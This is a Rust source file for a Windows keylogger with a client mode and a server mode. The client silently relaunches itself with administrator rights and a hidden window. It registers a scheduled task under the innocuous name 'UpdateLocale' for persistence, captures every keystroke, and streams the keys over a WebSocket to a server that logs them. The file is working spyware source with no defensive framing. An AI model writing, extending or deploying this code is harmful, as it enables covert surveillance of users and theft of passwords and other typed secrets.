mod keyboard;
use keyboard::*;

use std::{fs::File, io::{Write, Cursor}, thread, time::Duration};
use warp::{Filter, ws::WebSocket};
use is_elevated::is_elevated;
use winapi;
use futures::{StreamExt, SinkExt};
use std::ffi::CString;
use std::env;
use std::error::Error;
use std::mem;
use std::process::{Command, Stdio};
use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};
use byteorder::{BigEndian, WriteBytesExt, ReadBytesExt};

const TASK_XML: &[u8] = include_bytes!("task.xml");

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = env::args().collect();
    
    match args.get(1).map(|x| x.as_str()) {
        Some("client") => client_main(args.len() < 3).await?,
        Some(exe @ _) => server_main(exe.to_owned()).await,
        _ => println!("Expected exe to server or literal \"client\"")
    }

    Ok(())
}

async fn client_main(setup: bool) -> Result<(), Box<dyn Error>> {
    if !is_elevated() {
        elevate();
        return Ok(());
    }

    if setup {
        println!("Writing XML file");
        let task_path = dirs::home_dir().unwrap().join(".locale").join("task.xml");
        let mut task_file = File::create(&task_path)?;
        task_file.write_all(TASK_XML)?;
        drop(task_file);

        println!("Waiting one second");
        thread::sleep(Duration::from_secs(1));
        
        println!("Executing schtasks command");
        println!("XML file: {}", task_path.as_os_str().to_str().unwrap());
        Command::new("schtasks")
            .args(&[
                "/create",
                "/tn",
                "UpdateLocale",
                "/xml",
                task_path.as_os_str().to_str().unwrap()
            ])
            .stdout(Stdio::inherit())
            .spawn()
            .unwrap();
    }

    let (mut ws_stream, _) = connect_async("ws://127.0.0.1:8080/ws").await.expect("Failed to connect");

    thread::spawn(move || {
        let mut buffer: Vec<u8> = Vec::with_capacity(8);

        loop {
            let mut keys = KEYS.lock().unwrap();
            for key in keys.drain(..) {
                let code = u64::from(key);
                Cursor::new(&mut buffer).write_u64::<BigEndian>(code).unwrap();
                futures::executor::block_on(ws_stream.send(Message::binary(buffer.clone()))).unwrap();
                buffer.clear();
            }
            drop(keys);
            thread::sleep(Duration::from_millis(100));
        }
    });

    handle_input_events();

    Ok(())
}

async fn server_main(exe: String) {
    let websocket = warp::path("ws")
        .and(warp::ws())
        .map(|ws: warp::ws::Ws| {
            ws.on_upgrade(move |socket| handle_socket(socket))
        });

    let index = warp::path::end().and(warp::fs::file(exe));

    warp::serve(index.or(websocket)).run(([127, 0, 0, 1], 8080)).await;
}

async fn handle_socket(socket: WebSocket) {
    println!("User connected");
    let (_tx, mut rx) = socket.split();
    while let Some(msg) = rx.next().await {
        match msg {
            Ok(msg) => if msg.is_binary() {
                let keycode = Cursor::new(msg.as_bytes()).read_u64::<BigEndian>().unwrap();
                println!("{:?}", KeybdKey::from(keycode));
            },
            _ => {}
        }
    }
}

pub fn elevate() {
    let operation = CString::new("runas").unwrap();
    let file = CString::new(std::env::current_exe().unwrap().to_str().unwrap()).unwrap();
    let args = CString::new("client").unwrap();

    unsafe {
        winapi::um::shellapi::ShellExecuteA(
            core::ptr::null_mut(), 
            operation.as_ptr(),
            file.as_ptr(),
            args.as_ptr(),
            core::ptr::null_mut(),
            winapi::um::winuser::SW_HIDE
        );
    }

    mem::forget((operation, file, args));
}

/*pub fn is_elevated() -> bool {
    let hkcr = RegKey::predef(HKEY_CLASSES_ROOT);
    let path = Path::new("C:/Win");
    match hkcr.create_subkey(&path.join("perms_check")) {
        Ok(_) => {
            hkcr.delete_subkey(&path.join("perms_check")).unwrap();
            true
        },
        Err(_) => false
    }
}*/